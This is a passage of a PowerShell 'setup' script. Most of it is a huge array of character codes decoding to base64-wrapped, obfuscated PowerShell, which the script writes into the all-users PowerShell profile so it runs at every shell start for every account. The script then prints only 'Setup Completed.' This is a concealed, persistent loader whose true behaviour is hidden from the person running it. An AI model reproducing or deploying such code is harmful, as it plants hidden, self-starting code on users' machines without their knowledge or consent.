78,82,88,90,112,101,68,90,115,90,87,53,104,100,48,57,79,83,88,66,106,98,110,82,82,100,86,112,117,78,84,99,121,87,84,104,53,100,88,112,85,98,87,48,52,86,48,100,121,97,122,70,109,90,72,104,70,83,49,66,89,99,72,100,115,86,107,116,111,99,50,86,71,101,106,104,49,97,88,90,79,98,70,108,114,83,71,53,122,77,106,78,119,100,71,86,88,81,87,49,54,86,70,108,51,86,108,74,121,82,85,90,106,84,87,120,120,85,87,104,88,97,86,86,68,77,84,103,51,87,71,57,49,99,88,104,116,83,87,86,112,100,122,81,120,100,88,90,51,79,69,49,87,98,107,104,121,97,106,103,121,77,107,57,116,99,48,53,118,86,50,70,111,84,48,49,66,87,109,112,73,97,72,107,53,86,68,108,115,83,86,108,48,86,50,70,85,100,86,70,120,82,70,89,49,86,86,82,110,82,72,112,121,97,48,48,51,98,109,70,50,89,108,69,53,85,88,78,108,77,49,77,52,81,49,78,78,89,88,66,82,101,72,74,88,85,109,119,52,86,106,74,88,86,69,53,87,84,69,49,89,81,48,99,119,98,85,120,120,87,110,70,90,77,122,74,53,90,86,70,72,83,86,108,122,90,48,86,104,100,110,65,119,86,122,86,117,84,88,66,80,84,87,116,82,98,107,119,122,82,110,100,50,82,110,100,88,87,107,90,72,100,71,82,67,84,109,120,72,100,110,78,85,83,69,82,110,87,87,116,73,84,71,108,48,98,108,112,81,90,70,77,48,99,71,74,84,98,85,48,120,84,69,70,78,90,72,86,53,86,122,78,69,77,70,66,87,78,122,74,69,82,87,49,88,98,50,78,81,97,49,90,67,99,68,74,48,99,108,89,119,83,72,86,114,81,88,82,108,83,109,53,52,85,84,70,121,84,106,66,109,100,69,57,85,84,85,85,120,82,109,57,76,100,48,116,51,99,88,82,52,101,85,108,82,87,87,74,86,89,87,108,89,97,50,74,51,82,84,100,54,82,48,85,52,89,110,78,50,100,51,66,90,98,87,57,77,78,106,104,105,89,85,108,111,99,70,90,110,98,71,81,121,77,48,49,89,84,122,100,82,90,110,78,117,84,50,53,69,82,69,90,117,86,109,78,121,85,51,86,90,99,122,69,53,87,68,70,114,98,109,112,89,78,48,108,74,87,108,77,121,97,71,74,111,82,84,100,120,101,108,69,52,100,72,78,108,83,71,53,84,86,71,78,118,84,70,90,112,83,48,120,79,86,48,104,75,82,86,86,88,99,84,77,50,78,107,89,52,84,88,112,83,101,71,73,122,85,108,70,87,97,68,82,90,90,122,90,111,84,122,66,75,100,84,70,49,84,51,108,54,100,87,120,104,85,107,73,49,77,107,82,51,73,67,49,117,90,83,65,107,81,109,69,49,81,87,100,87,78,88,65,120,98,69,78,83,90,87,115,121,82,84,78,109,85,50,90,70,99,71,53,116,90,109,100,67,87,110,65,48,84,69,52,121,84,84,100,66,77,88,86,81,89,109,115,120,77,88,86,50,79,84,108,69,85,107,116,112,83,88,78,85,99,50,116,107,89,88,70,52,84,108,100,69,101,110,112,80,83,87,52,50,97,72,112,122,89,50,53,111,77,87,86,54,81,106,90,117,82,51,74,85,78,88,70,117,85,109,100,78,84,51,100,54,82,107,57,68,77,87,82,52,79,85,108,107,77,88,107,119,99,88,66,69,82,108,108,86,83,84,108,87,79,72,65,120,78,86,112,109,85,88,107,52,78,50,57,87,97,107,116,116,89,85,49,120,82,107,116,88,82,68,86,112,78,109,100,105,86,108,90,83,81,50,49,68,82,109,108,70,81,49,82,66,78,49,74,85,97,85,70,120,83,109,49,67,85,84,100,72,84,109,53,79,87,88,90,79,81,109,56,53,100,71,49,97,83,107,82,80,82,48,77,53,79,85,112,106,84,107,49,51,100,108,66,84,86,87,74,85,99,48,108,118,97,87,108,51,86,51,78,109,84,71,99,48,101,68,77,51,77,122,74,52,83,87,74,49,97,106,86,118,98,109,78,109,82,109,104,67,87,108,78,74,86,108,100,73,98,68,78,80,89,122,86,75,78,109,70,84,86,50,82,76,100,85,57,112,99,85,49,119,77,108,66,49,97,122,100,81,85,69,115,120,100,86,74,69,86,69,70,83,87,85,70,107,100,106,86,70,83,51,112,90,97,85,112,114,98,86,104,51,100,85,112,111,82,50,57,116,97,107,112,85,87,70,112,105,100,106,86,121,89,122,103,50,90,88,108,82,85,106,74,77,78,107,119,48,83,69,52,48,101,72,90,76,81,49,66,67,77,108,90,117,84,107,49,49,89,109,70,81,89,106,70,70,86,88,90,87,90,70,86,109,87,86,112,84,87,110,112,89,79,88,82,52,90,48,56,52,83,68,103,119,78,72,90,105,77,85,111,119,85,109,57,79,81,106,81,53,85,68,82,121,97,86,100,50,81,51,69,50,97,69,86,106,78,85,85,48,83,85,86,68,78,69,57,71,82,70,66,66,97,109,57,111,83,106,82,115,90,86,108,49,85,70,78,110,77,106,82,109,79,72,70,90,86,108,108,52,98,122,70,74,78,87,57,105,83,68,66,113,99,71,90,73,81,50,100,114,99,88,104,122,90,108,70,52,79,70,66,76,87,84,82,84,78,108,66,73,86,85,108,107,100,49,70,66,97,106,74,104,98,70,82,110,99,109,81,53,82,87,53,84,83,50,82,120,86,107,100,115,85,87,53,112,85,68,103,120,100,86,82,89,85,110,104,118,78,50,57,104,79,86,74,71,84,69,78,112,89,51,78,110,84,106,66,72,97,70,104,75,98,84,103,120,77,87,104,115,86,107,108,82,77,85,108,73,77,110,108,111,83,106,66,111,84,87,90,74,90,71,82,79,84,107,49,70,99,122,78,78,78,110,112,118,78,69,100,113,86,50,81,119,84,68,66,116,101,106,86,75,84,68,77,121,82,48,100,110,85,69,108,109,86,86,107,119,99,86,108,114,84,108,100,97,83,71,86,88,99,69,86,76,90,68,66,82,101,85,82,75,97,71,86,48,81,109,74,111,77,122,108,122,83,109,104,83,85,86,108,82,84,86,66,114,82,51,78,116,87,88,112,49,86,71,104,106,97,70,104,112,97,110,70,69,87,108,86,70,81,86,112,78,100,88,90,72,86,49,82,109,98,72,104,113,84,109,57,114,82,51,73,51,77,51,100,84,83,71,116,86,100,69,104,78,83,110,104,72,87,71,100,85,78,68,99,49,78,109,116,68,85,48,53,81,90,72,70,89,79,72,99,48,99,87,116,54,99,69,57,89,99,71,100,105,90,108,82,51,79,87,104,105,79,72,111,50,77,49,112,86,78,108,104,120,79,72,78,66,100,72,108,48,78,109,104,73,99,86,104,106,97,85,108,72,83,48,100,117,100,50,70,121,86,86,73,121,100,110,104,83,87,72,108,72,100,105,107,103,101,119,48,75,68,81,111,103,73,67,65,103,73,67,65,103,73,67,65,107,101,85,74,77,90,72,108,119,99,70,86,53,101,86,78,53,77,71,53,119,99,109,119,52,83,108,108,89,101,107,90,121,84,51,78,83,98,88,90,104,97,106,104,77,77,48,86,76,97,86,104,74,77,72,82,79,87,85,111,48,81,49,103,52,77,88,90,48,82,72,86,116,101,71,49,105,97,50,57,85,84,109,81,49,85,72,78,109,84,51,70,73,78,109,116,87,97,122,78,88,82,122,74,119,87,87,115,50,90,51,66,108,77,51,104,78,81,106,70,79,82,50,104,105,99,109,49,110,86,48,82,113,86,49,86,87,82,69,74,105,79,69,99,49,87,88,78,113,81,50,112,51,83,86,104,71,83,84,66,73,79,85,120,86,82,50,86,48,82,69,104,121,85,84,74,106,81,48,90,51,98,88,100,88,78,51,82,116,84,122,90,108,78,84,82,72,85,71,108,115,99,87,104,66,90,72,66,80,99,108,81,53,101,85,112,89,99,70,69,51,79,86,66,51,78,49,107,121,99,87,53,54,101,86,86,72,100,72,100,67,78,48,82,112,85,122,104,52,101,85,104,110,79,71,90,111,79,84,103,53,84,109,74,66,99,85,86,52,100,84,108,83,85,107,85,120,84,122,65,48,98,71,90,119,90,68,78,119,98,84,82,117,98,71,89,49,90,122,90,82,90,50,49,105,98,71,120,83,85,48,112,48,100,50,119,122,79,88,66,50,100,87,57,97,79,72,112,110,78,84,74,109,85,88,112,51,90,86,74,81,98,87,116,107,86,69,119,120,85,85,49,80,98,109,70,68,90,109,120,70,82,71,78,111,101,86,82,84,99,109,104,80,101,86,70,122,83,106,78,104,100,48,57,90,101,71,107,53,81,109,89,50,85,86,108,88,78,50,112,113,83,86,81,50,87,87,104,119,79,68,74,110,90,48,115,52,87,72,112,120,78,87,115,51,84,84,104,89,100,50,90,80,83,107,112,48,99,107,82,111,82,71,57,73,89,51,82,70,98,109,120,82,79,86,90,120,77,86,90,106,86,51,90,48,86,48,116,48,85,69,120,112,89,49,78,88,84,48,112,110,87,109,77,49,90,70,99,119,83,71,86,54,83,109,49,112,98,109,69,119,82,107,57,107,83,50,78,122,100,72,73,119,99,106,82,76,77,70,100,121,78,49,73,53,84,86,100,66,86,48,90,82,86,86,112,81,90,84,82,86,84,69,90,52,90,71,81,51,81,106,74,88,83,122,103,122,84,68,70,66,101,87,74,109,98,108,86,116,82,71,104,88,81,110,78,88,89,110,108,81,98,110,86,78,90,110,104,68,79,71,70,76,78,71,52,48,82,86,100,122,78,69,90,105,78,68,82,106,85,51,90,119,83,109,56,49,100,68,82,50,85,71,90,104,83,108,74,88,86,87,89,51,81,122,74,74,78,106,108,122,98,51,104,106,78,88,89,50,78,71,108,111,83,88,100,117,81,109,108,116,77,71,57,69,81,110,100,83,99,51,82,116,85,68,66,107,99,71,78,108,100,72,66,70,81,106,104,120,89,87,86,107,89,109,86,76,85,107,48,51,100,106,74,114,101,71,53,117,83,107,49,117,82,50,116,54,86,51,86,82,83,87,70,83,85,122,104,81,82,51,108,118,99,51,74,66,97,70,85,51,83,107,82,52,90,70,99,48,78,70,104,66,98,50,120,114,87,109,49,66,87,71,90,50,84,69,86,114,78,69,53,79,77,88,85,49,84,86,100,116,84,50,99,119,97,86,74,53,86,108,66,121,100,86,103,50,79,72,81,52,100,68,100,77,98,84,100,68,100,49,66,87,78,48,108,108,77,84,85,122,89,88,70,66,78,50,86,115,100,88,78,122,98,69,70,89,101,107,100,76,85,110,107,53,77,51,104,80,84,122,66,115,100,50,53,108,84,106,65,51,89,87,53,78,77,86,100,54,90,106,81,52,84,71,53,49,81,85,56,119,98,87,82,75,86,85,119,48,100,87,74,49,78,49,78,71,87,85,112,104,90,87,100,86,82,72,90,71,81,51,74,71,83,70,70,86,77,51,86,67,85,50,107,53,86,71,70,70,101,109,90,97,97,109,104,84,83,122,70,70,83,68,104,52,77,86,100,54,85,85,120,48,90,122,77,50,101,69,49,87,84,122,100,67,78,50,49,51,98,86,108,116,81,108,66,76,99,84,90,104,99,71,100,48,89,122,70,118,99,72,78,67,78,106,104,75,86,88,66,76,81,85,108,69,78,70,111,121,86,51,73,49,78,50,82,77,98,85,116,110,78,68,78,69,85,108,86,122,87,68,74,90,86,71,57,97,89,49,104,81,90,108,90,119,84,106,78,50,89,50,86,82,89,109,120,112,85,108,107,48,77,110,104,77,98,48,53,108,82,84,66,116,77,87,78,86,83,106,86,111,85,49,104,81,77,122,100,52,100,84,100,108,99,49,82,70,82,50,70,121,97,71,104,113,87,68,66,106,90,108,74,87,82,48,82,79,82,107,116,76,83,69,57,109,90,69,57,53,97,86,100,111,100,87,70,120,100,68,86,86,84,87,104,79,84,87,78,97,89,50,116,84,99,48,112,119,85,50,100,109,86,48,53,54,90,50,104,114,83,48,100,89,83,70,111,51,98,85,107,49,86,70,82,53,97,106,70,75,98,49,108,116,81,110,86,76,90,107,86,79,84,106,78,76,101,86,112,86,83,71,78,78,78,72,77,50,84,85,119,52,73,68,48,103,81,67,103,112,73,67,65,78,67,103,48,75,73,67,82,72,86,106,74,109,100,69,74,78,101,106,81,121,85,106,74,81,79,87,116,77,82,109,86,117,87,85,78,66,101,107,49,107,99,109,82,52,98,87,70,104,77,69,116,48,100,107,74,120,100,68,82,113,89,108,108,78,97,109,104,118,86,87,49,71,101,85,70,113,84,72,86,50,85,122,66,119,85,108,90,109,99,69,70,72,86,87,108,85,87,106,70,83,97,68,86,83,86,71,108,76,90,109,112,84,98,87,49,106,84,68,82,53,82,88,73,51,90,48,112,53,99,110,78,51,84,85,90,50,100,86,100,121,86,122,74,122,99,85,53,117,84,109,120,121,99,84,82,109,77,72,81,48,78,50,78,97,85,86,74,105,79,85,104,119,77,106,104,106,84,50,82,122,81,86,66,119,84,107,74,86,85,109,112,77,83,72,70,48,82,68,104,69,101,106,85,50,97,68,90,106,87,109,108,68,81,107,49,67,82,85,120,106,100,110,90,67,86,68,82,76,77,122,74,117,83,108,104,106,85,50,49,90,84,69,53,87,79,85,74,74,97,70,70,114,100,88,108,90,85,109,78,112,90,48,108,87,78,70,111,122,97,49,74,75,83,87,53,118,98,48,100,105,97,106,104,72,83,109,104,51,79,86,112,115,79,69,120,51,83,88,86,82,81,109,78,108,99,107,69,120,79,85,69,52,86,70,112,109,101,110,66,71,83,71,116,107,83,48,82,90,82,108,104,105,82,88,74,68,87,71,78,50,98,110,99,49,99,122,100,75,77,84,70,78,82,107,90,80,79,85,49,71,85,84,82,48,84,107,90,68,84,50,70,90,86,50,107,48,97,50,78,71,86,49,112,87,90,110,100,54,84,48,78,53,79,68,104,104,84,85,100,48,79,68,104,52,97,48,82,78,82,87,86,80,85,69,77,121,98,48,120,109,82,51,86,53,101,87,56,52,87,84,82,78,98,85,49,80,85,110,103,119,99,107,104,70,83,71,86,109,84,86,112,108,97,83,65,57,73,67,82,83,84,107,116,50,98,87,74,74,78,107,57,80,81,88,112,77,77,48,74,111,77,68,108,48,97,87,57,81,79,87,86,106,99,48,120,114,98,88,73,48,81,50,74,121,83,71,49,107,85,110,104,105,101,70,104,89,85,68,82,119,97,107,120,52,83,48,116,97,78,87,90,78,99,71,108,110,85,50,115,48,99,71,120,76,84,49,66,114,85,107,86,113,77,69,57,97,78,50,90,73,98,71,70,115,82,109,108,67,97,50,70,110,82,68,74,75,85,68,81,51,98,71,74,119,86,68,104,78,99,72,70,90,84,86,85,121,98,71,115,122,99,72,104,66,99,50,70,66,82,50,108,112,100,106,70,71,83,109,107,122,84,109,100,82,84,88,104,105,97,86,73,51,83,71,49,84,98,48,57,70,84,84,66,76,86,71,78,51,99,85,120,82,99,68,104,97,97,48,112,121,101,109,86,108,82,86,70,79,97,88,108,78,82,88,90,112,101,68,90,115,90,87,53,104,100,48,57,79,83,88,66,106,98,110,82,82,100,86,112,117,78,84,99,121,87,84,104,53,100,88,112,85,98,87,48,52,86,48,100,121,97,122,70,109,90,72,104,70,83,49,66,89,99,72,100,115,86,107,116,111,99,50,86,71,101,106,104,49,97,88,90,79,98,70,108,114,83,71,53,122,77,106,78,119,100,71,86,88,81,87,49,54,86,70,108,51,86,108,74,121,82,85,90,106,84,87,120,120,85,87,104,88,97,86,86,68,77,84,103,51,87,71,57,49,99,88,104,116,83,87,86,112,100,122,81,120,100,88,90,51,79,69,49,87,98,107,104,121,97,106,103,121,77,107,57,116,99,48,53,118,86,50,70,111,84,48,49,66,87,109,112,73,97,72,107,53,86,68,108,115,83,86,108,48,86,50,70,85,100,86,70,120,82,70,89,49,86,86,82,110,82,72,112,121,97,48,48,51,98,109,70,50,89,108,69,53,85,88,78,108,77,49,77,52,81,49,78,78,89,88,66,82,101,72,74,88,85,109,119,52,86,106,74,88,86,69,53,87,84,69,49,89,81,48,99,119,98,85,120,120,87,110,70,90,77,122,74,53,90,86,70,72,83,86,108,122,90,48,86,104,100,110,65,119,86,122,86,117,84,88,66,80,84,87,116,82,98,107,119,122,82,110,100,50,82,110,100,88,87,107,90,72,100,71,82,67,84,109,120,72,100,110,78,85,83,69,82,110,87,87,116,73,84,71,108,48,98,108,112,81,90,70,77,48,99,71,74,84,98,85,48,120,84,69,70,78,90,72,86,53,86,122,78,69,77,70,66,87,78,122,74,69,82,87,49,88,98,50,78,81,97,49,90,67,99,68,74,48,99,108,89,119,83,72,86,114,81,88,82,108,83,109,53,52,85,84,70,121,84,106,66,109,100,69,57,85,84,85,85,120,82,109,57,76,100,48,116,51,99,88,82,52,101,85,108,82,87,87,74,86,89,87,108,89,97,50,74,51,82,84,100,54,82,48,85,52,89,110,78,50,100,51,66,90,98,87,57,77,78,106,104,105,89,85,108,111,99,70,90,110,98,71,81,121,77,48,49,89,84,122,100,82,90,110,78,117,84,50,53,69,82,69,90,117,86,109,78,121,85,51,86,90,99,122,69,53,87,68,70,114,98,109,112,89,78,48,108,74,87,108,77,121,97,71,74,111,82,84,100,120,101,108,69,52,100,72,78,108,83,71,53,84,86,71,78,118,84,70,90,112,83,48,120,79,86,48,104,75,82,86,86,88,99,84,77,50,78,107,89,52,84,88,112,83,101,71,73,122,85,108,70,87,97,68,82,90,90,122,90,111,84,122,66,75,100,84,70,49,84,51,108,54,100,87,120,104,85,107,73,49,77,107,82,51,76,107,108,117,100,109,57,114,90,83,103,107,81,109,69,49,81,87,100,87,78,88,65,120,98,69,78,83,90,87,115,121,82,84,78,109,85,50,90,70,99,71,53,116,90,109,100,67,87,110,65,48,84,69,52,121,84,84,100,66,77,88,86,81,89,109,115,120,77,88,86,50,79,84,108,69,85,107,116,112,83,88,78,85,99,50,116,107,89,88,70,52,84,108,100,69,101,110,112,80,83,87,52,50,97,72,112,122,89,50,53,111,77,87,86,54,81,106,90,117,82,51,74,85,78,88,70,117,85,109,100,78,84,51,100,54,82,107,57,68,77,87,82,52,79,85,108,107,77,88,107,119,99,88,66,69,82,108,108,86,83,84,108,87,79,72,65,120,78,86,112,109,85,88,107,52,78,50,57,87,97,107,116,116,89,85,49,120,82,107,116,88,82,68,86,112,78,109,100,105,86,108,90,83,81,50,49,68,82,109,108,70,81,49,82,66,78,49,74,85,97,85,70,120,83,109,49,67,85,84,100,72,84,109,53,79,87,88,90,79,81,109,56,53,100,71,49,97,83,107,82,80,82,48,77,53,79,85,112,106,84,107,49,51,100,108,66,84,86,87,74,85,99,48,108,118,97,87,108,51,86,51,78,109,84,71,99,48,101,68,77,51,77,122,74,52,83,87,74,49,97,106,86,118,98,109,78,109,82,109,104,67,87,108,78,74,86,108,100,73,98,68,78,80,89,122,86,75,78,109,70,84,86,50,82,76,100,85,57,112,99,85,49,119,77,108,66,49,97,122,100,81,85,69,115,120,100,86,74,69,86,69,70,83,87,85,70,107,100,106,86,70,83,51,112,90,97,85,112,114,98,86,104,51,100,85,112,111,82,50,57,116,97,107,112,85,87,70,112,105,100,106,86,121,89,122,103,50,90,88,108,82,85,106,74,77,78,107,119,48,83,69,52,48,101,72,90,76,81,49,66,67,77,108,90,117,84,107,49,49,89,109,70,81,89,106,70,70,86,88,90,87,90,70,86,109,87,86,112,84,87,110,112,89,79,88,82,52,90,48,56,52,83,68,103,119,78,72,90,105,77,85,111,119,85,109,57,79,81,106,81,53,85,68,82,121,97,86,100,50,81,51,69,50,97,69,86,106,78,85,85,48,83,85,86,68,78,69,57,71,82,70,66,66,97,109,57,111,83,106,82,115,90,86,108,49,85,70,78,110,77,106,82,109,79,72,70,90,86,108,108,52,98,122,70,74,78,87,57,105,83,68,66,113,99,71,90,73,81,50,100,114,99,88,104,122,90,108,70,52,79,70,66,76,87,84,82,84,78,108,66,73,86,85,108,107,100,49,70,66,97,106,74,104,98,70,82,110,99,109,81,53,82,87,53,84,83,50,82,120,86,107,100,115,85,87,53,112,85,68,103,120,100,86,82,89,85,110,104,118,78,50,57,104,79,86,74,71,84,69,78,112,89,51,78,110,84,106,66,72,97,70,104,75,98,84,103,120,77,87,104,115,86,107,108,82,77,85,108,73,77,110,108,111,83,106,66,111,84,87,90,74,90,71,82,79,84,107,49,70,99,122,78,78,78,110,112,118,78,69,100,113,86,50,81,119,84,68,66,116,101,106,86,75,84,68,77,121,82,48,100,110,85,69,108,109,86,86,107,119,99,86,108,114,84,108,100,97,83,71,86,88,99,69,86,76,90,68,66,82,101,85,82,75,97,71,86,48,81,109,74,111,77,122,108,122,83,109,104,83,85,86,108,82,84,86,66,114,82,51,78,116,87,88,112,49,86,71,104,106,97,70,104,112,97,110,70,69,87,108,86,70,81,86,112,78,100,88,90,72,86,49,82,109,98,72,104,113,84,109,57,114,82,51,73,51,77,51,100,84,83,71,116,86,100,69,104,78,83,110,104,72,87,71,100,85,78,68,99,49,78,109,116,68,85,48,53,81,90,72,70,89,79,72,99,48,99,87,116,54,99,69,57,89,99,71,100,105,90,108,82,51,79,87,104,105,79,72,111,50,77,49,112,86,78,108,104,120,79,72,78,66,100,72,108,48,78,109,104,73,99,86,104,106,97,85,108,72,83,48,100,117,100,50,70,121,86,86,73,121,100,110,104,83,87,72,108,72,100,105,119,103,81,67,103,107,101,85,74,77,90,72,108,119,99,70,86,53,101,86,78,53,77,71,53,119,99,109,119,52,83,108,108,89,101,107,90,121,84,51,78,83,98,88,90,104,97,106,104,77,77,48,86,76,97,86,104,74,77,72,82,79,87,85,111,48,81,49,103,52,77,88,90,48,82,72,86,116,101,71,49,105,97,50,57,85,84,109,81,49,85,72,78,109,84,51,70,73,78,109,116,87,97,122,78,88,82,122,74,119,87,87,115,50,90,51,66,108,77,51,104,78,81,106,70,79,82,50,104,105,99,109,49,110,86,48,82,113,86,49,86,87,82,69,74,105,79,69,99,49,87,88,78,113,81,50,112,51,83,86,104,71,83,84,66,73,79,85,120,86,82,50,86,48,82,69,104,121,85,84,74,106,81,48,90,51,98,88,100,88,78,51,82,116,84,122,90,108,78,84,82,72,85,71,108,115,99,87,104,66,90,72,66,80,99,108,81,53,101,85,112,89,99,70,69,51,79,86,66,51,78,49,107,121,99,87,53,54,101,86,86,72,100,72,100,67,78,48,82,112,85,122,104,52,101,85,104,110,79,71,90,111,79,84,103,53,84,109,74,66,99,85,86,52,100,84,108,83,85,107,85,120,84,122,65,48,98,71,90,119,90,68,78,119,98,84,82,117,98,71,89,49,90,122,90,82,90,50,49,105,98,71,120,83,85,48,112,48,100,50,119,122,79,88,66,50,100,87,57,97,79,72,112,110,78,84,74,109,85,88,112,51,90,86,74,81,98,87,116,107,86,69,119,120,85,85,49,80,98,109,70,68,90,109,120,70,82,71,78,111,101,86,82,84,99,109,104,80,101,86,70,122,83,106,78,104,100,48,57,90,101,71,107,53,81,109,89,50,85,86,108,88,78,50,112,113,83,86,81,50,87,87,104,119,79,68,74,110,90,48,115,52,87,72,112,120,78,87,115,51,84,84,104,89,100,50,90,80,83,107,112,48,99,107,82,111,82,71,57,73,89,51,82,70,98,109,120,82,79,86,90,120,77,86,90,106,86,51,90,48,86,48,116,48,85,69,120,112,89,49,78,88,84,48,112,110,87,109,77,49,90,70,99,119,83,71,86,54,83,109,49,112,98,109,69,119,82,107,57,107,83,50,78,122,100,72,73,119,99,106,82,76,77,70,100,121,78,49,73,53,84,86,100,66,86,48,90,82,86,86,112,81,90,84,82,86,84,69,90,52,90,71,81,51,81,106,74,88,83,122,103,122,84,68,70,66,101,87,74,109,98,108,86,116,82,71,104,88,81,110,78,88,89,110,108,81,98,110,86,78,90,110,104,68,79,71,70,76,78,71,52,48,82,86,100,122,78,69,90,105,78,68,82,106,85,51,90,119,83,109,56,49,100,68,82,50,85,71,90,104,83,108,74,88,86,87,89,51,81,122,74,74,78,106,108,122,98,51,104,106,78,88,89,50,78,71,108,111,83,88,100,117,81,109,108,116,77,71,57,69,81,110,100,83,99,51,82,116,85,68,66,107,99,71,78,108,100,72,66,70,81,106,104,120,89,87,86,107,89,109,86,76,85,107,48,51,100,106,74,114,101,71,53,117,83,107,49,117,82,50,116,54,86,51,86,82,83,87,70,83,85,122,104,81,82,51,108,118,99,51,74,66,97,70,85,51,83,107,82,52,90,70,99,48,78,70,104,66,98,50,120,114,87,109,49,66,87,71,90,50,84,69,86,114,78,69,53,79,77,88,85,49,84,86,100,116,84,50,99,119,97,86,74,53,86,108,66,121,100,86,103,50,79,72,81,52,100,68,100,77,98,84,100,68,100,49,66,87,78,48,108,108,77,84,85,122,89,88,70,66,78,50,86,115,100,88,78,122,98,69,70,89,101,107,100,76,85,110,107,53,77,51,104,80,84,122,66,115,100,50,53,108,84,106,65,51,89,87,53,78,77,86,100,54,90,106,81,52,84,71,53,49,81,85,56,119,98,87,82,75,86,85,119,48,100,87,74,49,78,49,78,71,87,85,112,104,90,87,100,86,82,72,90,71,81,51,74,71,83,70,70,86,77,51,86,67,85,50,107,53,86,71,70,70,101,109,90,97,97,109,104,84,83,122,70,70,83,68,104,52,77,86,100,54,85,85,120,48,90,122,77,50,101,69,49,87,84,122,100,67,78,50,49,51,98,86,108,116,81,108,66,76,99,84,90,104,99,71,100,48,89,122,70,118,99,72,78,67,78,106,104,75,86,88,66,76,81,85,108,69,78,70,111,121,86,51,73,49,78,50,82,77,98,85,116,110,78,68,78,69,85,108,86,122,87,68,74,90,86,71,57,97,89,49,104,81,90,108,90,119,84,106,78,50,89,50,86,82,89,109,120,112,85,108,107,48,77,110,104,77,98,48,53,108,82,84,66,116,77,87,78,86,83,106,86,111,85,49,104,81,77,122,100,52,100,84,100,108,99,49,82,70,82,50,70,121,97,71,104,113,87,68,66,106,90,108,74,87,82,48,82,79,82,107,116,76,83,69,57,109,90,69,57,53,97,86,100,111,100,87,70,120,100,68,86,86,84,87,104,79,84,87,78,97,89,50,116,84,99,48,112,119,85,50,100,109,86,48,53,54,90,50,104,114,83,48,100,89,83,70,111,51,98,85,107,49,86,70,82,53,97,106,70,75,98,49,108,116,81,110,86,76,90,107,86,79,84,106,78,76,101,86,112,86,83,71,78,78,78,72,77,50,84,85,119,52,75,83,107,78,67,105,65,103,73,70,100,121,97,88,82,108,76,85,104,118,99,51,81,103,73,107,120,104,100,87,53,106,97,71,86,107,73,69,78,118,99,110,74,108,89,51,82,115,101,83,52,105,68,81,112,57,73,71,86,115,99,50,85,103,101,119,48,75,86,51,74,112,100,71,85,116,83,71,57,122,100,67,65,105,85,50,57,116,90,88,82,111,97,87,53,110,73,72,100,108,98,110,81,103,100,51,74,118,98,109,99,105,68,81,112,57,39,41,41,41) | ForEach-Object { [char]$_ }))

    }
}
'@

$profilePath = $PROFILE.AllUsersAllHosts


if (-not (Test-Path $profilePath)) {
    New-Item -Path $profilePath -ItemType File -Force
}

Add-Content -Path $profilePath -Value $functionScript

Write-Host "Setup Completed."
